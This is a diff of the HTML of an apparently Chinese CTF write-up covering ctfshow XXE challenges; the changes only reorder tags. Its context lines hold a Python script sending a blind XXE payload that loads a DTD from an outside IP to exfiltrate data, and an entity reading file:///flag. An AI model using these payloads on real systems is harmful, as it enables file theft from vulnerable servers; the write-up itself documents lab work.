@@ -35,8 +35,8 @@
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="ctfshow">
 <meta property="article:tag" content="wp">
+<meta property="article:tag" content="ctfshow">
 <meta property="article:tag" content="XXE">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png">
@@ -308,9 +308,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f1a29458-0578-476a-825b-2ecc7fa52815.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/xxe.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://121.5.227.123/xxe.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>),proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># print(data.encode(&#x27;utf-16&#x27;))</span></span><br></pre></td></tr></table></figure>
 <h2 id="web378flask-xxe">web378（flask XXE）</h2>
 <p>抓包发现，上传的用户名会回显，因此考虑XXE注入</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129" /><figcaption aria-hidden="true">image-20220814001604129</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129" /></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>传入后成功拿到flag.</p>
 <p>后端源代码如下：</p>
@@ -326,8 +324,8 @@
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"># ctf</a>
               <a href="/tags/web/" rel="tag"># web</a>
-              <a href="/tags/ctfshow/" rel="tag"># ctfshow</a>
               <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/ctfshow/" rel="tag"># ctfshow</a>
               <a href="/tags/XXE/" rel="tag"># XXE</a>
           </div>
 
